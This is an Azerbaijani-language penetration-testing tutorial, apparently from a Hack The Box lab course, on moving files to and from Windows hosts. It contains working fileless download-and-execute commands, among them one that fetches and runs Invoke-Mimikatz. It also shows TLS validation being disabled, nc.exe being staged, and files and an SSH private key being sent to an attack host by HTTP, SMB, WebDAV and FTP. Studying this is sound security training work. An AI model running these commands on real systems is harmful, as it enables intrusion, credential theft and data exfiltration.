Windows Fayl Köçürmə Metodları

**Giriş**
Son bir neçə ildə Windows əməliyyat sistemi inkişaf etmiş və yeni versiyalar fayl köçürmə əməliyyatları üçün müxtəlif utilitlərlə gəlmişdir. Windows-da fayl köçürməni başa düşmək həm hücumçulara, həm də müdafiəçilərə kömək edə bilər. Hücumçular əməliyyat aparmaq və tutulmamaq üçün müxtəlif fayl köçürmə üsullarından istifadə edə bilərlər. Müdafiəçilər isə bu üsulların necə işlədiyini öyrənərək onları monitorinq edə və kompromisə uğramamağa yönəlmiş uyğun siyasətlər yarada bilərlər. Məsələn, Microsoft-un Astaroth hücumu (Astaroth Attack) blog yazısını müasir davamlı təhdid (APT) nümunəsi kimi götürək.

**Fayl-sız (fileless) təhdidlər**
Blog yazısı fayl-sız təhdidlərdən danışmaqla başlayır. “Fayl-sız” termini təhdidin faylda gəlmədiyini, hücum üçün sistemə daxil olan legitim alətlərdən istifadə etdiyini göstərir. Bu isə o demək deyil ki, fayl ötürmə əməliyyatı baş vermir. Bu bölmədə daha sonra müzakirə ediləcəyi kimi, fayl sistem üzərində "mövcud" olmur, əvəzinə yaddaşda işlədilir.

**Astaroth hücumunun ümumi mərhələləri**
Astaroth hücumu adətən aşağıdakı mərhələləri izləyirdi: spear-phishing (hədəflənmiş e-poçt) içərisindəki zərərli link LNK faylına aparırdı. LNK faylı iki dəfə klikləndikdə, WMIC alətinin `/Format` parametrinin icrasına səbəb olurdu ki, bu da zərərli JavaScript kodunun endirilməsini və icrasını təmin edirdi. JavaScript kodu isə Bitsadmin alətindən sui-istifadə edərək payloadları yükləyirdi.

Bütün payloadlar base64 ilə kodlanmışdı və Certutil aləti vasitəsilə dekod edilərək bir neçə DLL faylı əldə edilirdi. Daha sonra `regsvr32` aləti dekod edilmiş DLL-lərin birini yükləmək üçün istifadə olunurdu; həmin DLL digər faylları deşifrə edib yükləyirdi və nəticədə son payload — Astaroth — Userinit prosesi daxilinə enjekte edilirdi.

Aşağıda hücumun qrafik təsviri verilmişdir.

<img width="1597" height="1324" alt="image" src="https://github.com/user-attachments/assets/4e957388-7089-4ba6-8e4b-2400888c77e2" />

Bu, fayl köçürmənin bir neçə üsuluna və təhdid aktorunun müdafiələri keçmək üçün bu üsullardan necə istifadə etməsinə dair əla nümunədir.

Bu bölmə yükləmə və yükləmə (download və upload) əməliyyatları üçün bəzi yerli Windows alətlərindən istifadəni müzakirə edəcək. Modulun daha sonrakı hissəsində Windows və Linux-da Living Off The Land (LOTL) binary-lərinin nə olduğu və fayl köçürmə əməliyyatlarını həyata keçirmək üçün necə istifadə edilə biləcəyi barədə danışacağıq.

**Yükləmə əməliyyatları**
Bizim MS02 maşınına girişimiz var və Pwnbox maşınımızdan bir faylı yükləmək lazımdır. Gəlin bunu bir neçə Fayl Yükləmə metodundan istifadə edərək necə həyata keçirə biləcəyimizi nəzərdən keçirək.

<img width="757" height="299" alt="image" src="https://github.com/user-attachments/assets/6bdd2aae-1012-49b0-a937-bdd76e97ad76" />

## PowerShell ilə Base64 Kodlama və Dekodlama

Faylları şəbəkə olmadan bir yerdən başqa yerə köçürmək üçün maraqlı bir üsuldan istifadə edə bilərik. Fayl kiçikdirsə, biz onu **Base64** adlı bir formata çeviririk (kodlayırıq). Bu format sadəcə uzun bir hərflər və rəqəmlər sətridir.

1.  **Terminalda çevirmə (Kodlama):** Faylı Base64 sətrinə çeviririk.
2.  **Kopyalama:** Həmin uzun sətri kopyalayırıq (məsələn, Pwnbox-dan Windows-a).
3.  **Geri çevirmə (Dekodlama):** Windows tərəfindəki terminalda bu sətri yenidən orijinal fayla çeviririk.

Bu prosesin düzgün işlədiyini yoxlamaq üçün **MD5 Heş** (rəqəmsal barmaq izi) adlanan bir vasitədən istifadə edirik. Faylın MD5 kodu hər yerdə eyni olmalıdır.

### Nümunə: SSH Açarı Köçürmə

**1. Başlanğıcda Faylın MD5 Kodunu Yoxlama (Pwnbox-da):**

```
nijatmansimov@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```

**2. Faylı Base64-ə Kodlama (Pwnbox-da):**

```
nijatmansimov@htb[/htb]$ cat id_rsa |base64 -w 0;echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

**3. Base64 Sətrini Fayla Çevirmə (Windows PowerShell-də):**

Bu uzun sətri kopyalayıb PowerShell-də bu əmri işlədirik. Əmr, Base64 sətrini oxuyur və onu "C:\\Users\\Public\\id\_rsa" adlanan fayl kimi saxlayır.

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("... Base64 Sətri Buraya Gedir ..."))
```

**4. Köçürülən Faylın MD5 Kodunu Təsdiqləmə (Windows PowerShell-də):**

```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

Göründüyü kimi, hər iki MD5 kodu **uyğundur** (**4E301756A07DED0A2DD6953ABF015278**). Bu, faylın uğurla köçürüldüyü deməkdir\!

> **Unutmayın:** Bu üsul böyük fayllar üçün yaxşı deyil, çünki Windows terminalının (cmd.exe) daxil edə biləcəyi sətrin uzunluğunda bir məhdudiyyət (8,191 simvol) var.

-----

## PowerShell ilə Vebdən Fayl Yükləmə

Şəbəkə rabitəsinin olduğu yerdə, PowerShell-in daha güclü imkanlarından istifadə edə bilərik.

### 1\. `DownloadFile` Metodu (Faylı Diskə Saxlamaq)

Bu ən sadə üsullardan biridir. **Net.WebClient** istifadə edərək bir URL-dəki faylı birbaşa kompüterimizdəki bir yerə (diskə) yükləyirik.

```powershell
# Ümumi forma: (New-Object Net.WebClient).DownloadFile('<URL>','<Saxlanılacaq Yer>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### 2\. `DownloadString` - Faylsız Yükləmə (Birbaşa Yaddaşa Yükləyib İcra Etmək)

Bu, **"faylsız hücum"** adlanır, çünki skripti kompüterin yaddaşına yükləyir, diskə **saxlamır**, və dərhal işə salır. Bu, müdafiəçilərin aşkarlamasını çətinləşdirir.

Bunu etmək üçün **Invoke-Expression** (qısa adı **IEX**) əmrindən istifadə edirik.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Və ya bu formada da yazmaq olar:

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('...skript URL-i...') | IEX
```

### 3\. `Invoke-WebRequest`

PowerShell 3.0 və yuxarı versiyalarında mövcud olan bu əmr, bir faylı yükləmək üçün də istifadə edilə bilər. Onun qısa adları **iwr**, **curl** və **wget**-dir.

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
Harmj0y PowerShell yükləmə "beşikləri"nin (download cradles) geniş siyahısını burada toplayıb. Hər vəziyyət üçün uyğun olanı seçmək məqsədilə, proksi şüurunun olmaması və ya diskə toxunma (hədəfə fayl yüklənməsi) kimi onların incəlikləri və fərqləri ilə tanış olmaq vacibdir.

### PowerShell ilə Tez-tez Rast Gəlinən Səhvlər

İnternet Explorer-in ilk işə salınma konfiqurasiyasının tamamlanmadığı hallar ola bilər ki, bu da yüklənmənin qarşısını alır.

<img width="1336" height="700" alt="image" src="https://github.com/user-attachments/assets/55458996-c398-467d-9e40-2e0bc5f941c9" />

Bunu `-UseBasicParsing` parametrindən istifadə etməklə keçmək olar.

```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

PowerShell yükləmələrindəki başqa bir səhv, sertifikata etibar edilmədiyi təqdirdə SSL/TLS təhlükəsiz kanalı ilə bağlıdır. Bu səhvi aşağıdakı əmrlə keçə bilərik:

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**SMB Yükləmələri**
Server Message Block protokolu (SMB protokolu), TCP/445 portunda işləyir və Windows xidmətlərinin işlədiyi müəssisə şəbəkələrində geniş istifadə olunur. Bu protokol tətbiqlərə və istifadəçilərə uzaq serverlərdən faylları yükləməyə və göndərməyə imkan verir.

SMB-dən istifadə edərək Pwnbox-dan asanlıqla fayl yükləyə bilərik. Bunun üçün Pwnbox-da Impacket kitabxanasından olan `smbserver.py` skripti ilə SMB server yaratmalı və sonra `copy`, `move`, PowerShell-in `Copy-Item` əmri və ya SMB-yə qoşulmağa imkan verən digər vasitələrdən istifadə etməliyik.

**SMB Serverini Yaratmaq**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Konfiqurasiya faylı oxundu
[*] UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 üçün callback əlavə edildi V:3.0
[*] UUID 6BFFD098-A112-3610-9833-46C3F87E345A üçün callback əlavə edildi V:1.0
[*] Konfiqurasiya faylı oxundu
[*] Konfiqurasiya faylı oxundu
[*] Konfiqurasiya faylı oxundu
```

SMB serverdən cari işçi qovluğa fayl yükləmək üçün aşağıdakı əmrdən istifadə edə bilərik:

**SMB Serverdən Fayl Kopyalamaq**
Windows Fayl Transfer Metodları

```
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 fayl kopyalandı.
```

Yeni Windows versiyaları identifikasiyasız qonaq girişini bloklayır. Aşağıdakı əmrdə də bunu görə bilərik:

```
C:\htb> copy \\192.168.220.133\share\nc.exe

Bu paylaşılan qovluğa giriş edə bilməzsiniz, çünki təşkilatınızın təhlükəsizlik siyasətləri identifikasiyasız qonaq girişini bloklayır. Bu siyasətlər PC-nizi şəbəkədə təhlükəli və ya zərərli cihazlardan qorumağa kömək edir.
```

Belə vəziyyətdə fayl ötürmək üçün Impacket SMB serverini istifadəçi adı və şifrə ilə qurub Windows hədəf maşınına SMB serveri qoşmalıyıq:

**İstifadəçi adı və şifrə ilə SMB Server yaratmaq**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Konfiqurasiya faylı oxundu
[*] UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 üçün callback əlavə edildi V:3.0
[*] UUID 6BFFD098-A112-3610-9833-46C3F87E345A üçün callback əlavə edildi V:1.0
[*] Konfiqurasiya faylı oxundu
[*] Konfiqurasiya faylı oxundu
[*] Konfiqurasiya faylı oxundu
```

**İstifadəçi adı və şifrə ilə SMB Serveri Qoşmaq**
Windows Fayl Transfer Metodları

```
C:\htb> net use n: \\192.168.220.133\share /user:test test

Əmr uğurla tamamlandı.

C:\htb> copy n:\nc.exe
        1 fayl kopyalandı.
```

Qeyd: Əgər `copy filename \\IP\sharename` əmri ilə problem yaşayırsınızsa, SMB serveri mount etmək də kömək edə bilər.

---

**FTP Yükləmələri**
Başqa bir fayl ötürmə üsulu FTP (File Transfer Protocol) istifadə etməkdir. FTP TCP/21 və TCP/20 portlarında işləyir. Windows-da quraşdırılmış FTP client və ya PowerShell-in `Net.WebClient`-indən istifadə edərək faylları FTP serverdən yükləyə bilərik.

Hücum hostumuzda Python3 `pyftpdlib` modulu ilə FTP server qura bilərik. Bu modulu aşağıdakı kimi quraşdırmaq olar:

**FTP Server Python3 Modulunun Qurulması - pyftpdlib**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo pip3 install pyftpdlib
```

Sonra port nömrəsi olaraq 21-i təyin edə bilərik, çünki `pyftpdlib` default olaraq 2121 portunu istifadə edir. İstifadəçi adı və şifrə təyin etməsək, anonim giriş aktiv olur.

**Python3 FTP Serverini Quraşdırmaq**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> 0.0.0.0:21 ünvanında FTP server başladı, pid=3210 <<<
```

FTP server qurulduqdan sonra Windows-un əvvəlcədən quraşdırılmış FTP clienti və ya PowerShell `Net.WebClient`-i ilə fayl ötürmə əməliyyatı həyata keçirilə bilər.

---

**PowerShell ilə FTP Serverdən Fayl Transferi**
Windows Fayl Transfer Metodları

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Əgər uzaq maşında shellimiz interaktiv deyilsə, FTP əmrlərini içərisində yazdığımız fayl yarada və sonra FTP clienti ilə həmin əmrləri icra etdirə bilərik.

**FTP Client üçün Əmrlər Faylı Yaratmaq və Hədəf Faylı Yükləmək**
Windows Fayl Transfer Metodları

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb> more file.txt
This is a test file
```

---

**Yükləmə Əməliyyatları**
Bəzən parol qırmaq, analiz etmək, məlumat çıxarmaq və s. kimi işlərdə faylları hədəf maşından hücum hostuna yükləmək lazım olur. Bu əməliyyatları yükləmə üçün istifadə etdiyimiz eyni üsullarla həyata keçirə bilərik. Gəlin yükləməni müxtəlif yollarla necə edə biləcəyimizə baxaq.

---

**PowerShell Base64 Kodlaşdırma və Dekodlaşdırma**
Əvvəl PowerShelldə base64 stringi necə deşifrə etdiyimizi gördük. İndi isə faylı base64-ə çevirək ki, hücum hostumuzda onu deşifrə edə bilək.

**PowerShelldə Fayl Kodlaşdırmaq**
Windows Fayl Transfer Metodları

```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

<base64 çıxışı>

PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Bu məzmunu kopyalayıb hücum hosta yapışdırırıq, `base64` əmri ilə deşifrə edir və `md5sum` tətbiqi ilə faylın düzgün ötürülüb-ötürülmədiyini yoxlayırıq.

**Linuxda Base64 Stringi Dekodlaşdırmaq**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ echo <base64 məzmunu> | base64 -d > hosts

nijatmansimov@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```

---

**PowerShell Web Yükləmələri**
PowerShelldə fayl yükləmə əməliyyatları üçün daxili funksiya yoxdur, lakin `Invoke-WebRequest` və ya `Invoke-RestMethod` istifadə edərək yükləmə funksiyası yarada bilərik. Bunun üçün yükləməni qəbul edən web serverə ehtiyac var, amma adi webserverlərdə bu funksiya yoxdur.

Biz Python-un `uploadserver` modulundan istifadə edə bilərik. Bu modul HTTP.server modulunun genişləndirilməsi olub, fayl yükləmə səhifəsini dəstəkləyir. Onu quraşdırıb işə salaq:

**Yükləmə Funksiyalı Web Serverin Quraşdırılması**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ pip3 install uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver
```

```
nijatmansimov@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Sonra PowerShell skripti `PSUpload.ps1` istifadə edərək faylı yükləyə bilərik. Skript iki parametr qəbul edir: `-File` (faylın yolu) və `-Uri` (yükləmənin ediləcəyi server URL-i). Məsələn, Windows hostumuzdan `hosts` faylını yükləyək:

**PowerShell Skripti ilə Python Upload Serverə Fayl Yükləmək**
Windows Fayl Transfer Metodları

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

---

**PowerShell Base64 Web Yükləməsi**
Başqa üsul isə PowerShell və base64 kodlaşdırılmış fayllardan istifadə edərək `Invoke-WebRequest` və ya `Invoke-RestMethod` ilə birlikdə Netcat-dən istifadə etməkdir. Netcat müəyyən portu dinləyir və faylı POST sorğusu kimi göndərir. Nəticədə çıxışı kopyalayıb base64 vasitəsilə deşifrə edirik.

```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```
nijatmansimov@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

<base64 məzmunu>
```

```
nijatmansimov@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

---

**SMB Yükləmələri**
Əvvəl qeyd etdik ki, müəssisələr ümumiyyətlə HTTP (TCP/80) və HTTPS (TCP/443) üçün çıxış trafikinə icazə verir. Çox vaxt SMB protokolu (TCP/445) daxili şəbəkədən kənara icazə verilmir, çünki bu, şəbəkəni mümkün hücumlardan açıq edə bilər. Bu haqda daha ətraflı Microsoft-un "Preventing SMB traffic from lateral connections and entering or leaving the network" adlı məqaləsində oxuya bilərsiniz.

Alternativ olaraq, SMB-ni HTTP üzərində WebDAV ilə işlətmək mümkündür. WebDAV (RFC 4918) HTTP protokolunun bir genişlənməsidir. Vebserverin faylserver kimi davranmasına, həmçinin əməkdaşlıq üçün məzmunun yaradılmasını dəstəkləyir. WebDAV HTTPS də istifadə edə bilər.

<img width="1139" height="466" alt="image" src="https://github.com/user-attachments/assets/8846577b-e802-4a1a-9af0-19fca2130feb" />

# WebDAV Serverinin Konfiqurasiyası

WebDAV serverimizi qurmaq üçün iki Python modulu — `wsgidav` və `cheroot` — quraşdırmalıyıq (bu implementasiya haqqında daha çox məlumatı burada oxuya bilərsiniz: wsgidav github). Onları quraşdırdıqdan sonra hədəf kataloqda `wsgidav` tətbiqini işə salırıq.

**WebDAV Python modullarının quraşdırılması**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

**WebDAV Python modulundan istifadə**
Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

---

# WebDAV Paylaşımına Qoşulma

İndi paylaşımə `DavWWWRoot` kataloqu vasitəsilə qoşulmağa cəhd edə bilərik.

Windows Fayl Transfer Metodları

```
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

Qeyd: `DavWWWRoot` Windows Shell tərəfindən tanınan xüsusi bir açar sözdür. Belə bir qovluq sizin WebDAV serverinizdə mövcud deyil. `DavWWWRoot` açar sözü Mini-Redirector drayverinə (WebDAV sorğularını idarə edən) serverin kökünə qoşulduğunuzu bildirir.

Serverə qoşularkən serverdə mövcud olan bir qovluğu göstərsəniz bu açar sözündən istifadə etməyə ehtiyac qalmır. Məsələn: `\\192.168.49.128\sharefolder`

---

# Faylları SMB ilə Yükləmək (Upload)

Windows Fayl Transfer Metodları

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

Qeyd: Əgər SMB (TCP/445) məhdudiyyətləri yoxdursa, `impacket-smbserver`-dən yuxarıdakı kimi istifadə edərək download əməliyyatlarında etdiyimiz kimi upload üçün də istifadə edə bilərsiniz.

---

# FTP ilə Yükləmələr (Upload)

FTP ilə fayl yükləmək (upload) yükləmə (download) prosesinə çox oxşardır. PowerShell və ya FTP client-dən istifadə edə bilərik. Python `pyftpdlib` modulundan istifadə edərək FTP serveri işə salmazdan əvvəl `--write` seçimini göstərməliyik ki, client-lər hücum hostumuza fayl yükləyə bilsinlər.

Windows Fayl Transfer Metodları

```
nijatmansimov@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

İndi PowerShell upload funksiyasından istifadə edərək faylı FTP serverə yükləyək.

**PowerShell ilə Fayl Yükləmək**
Windows Fayl Transfer Metodları

```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**FTP Client üçün Əmrlər Faylı Yaratmaq (Upload üçün)**
Windows Fayl Transfer Metodları

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---

# Yekun (Recap)

Biz Windows-un yerli vasitələrindən istifadə edərək fayl yükləmə və yükləmə (download və upload) üçün bir neçə üsul müzakirə etdik, amma daha çox üsul mövcuddur. Növbəti bölümlərdə fayl ötürmə əməliyyatlarını həyata keçirmək üçün istifadə edə biləcəyimiz digər mexanizmlər və alətlər barədə danışacağıq.









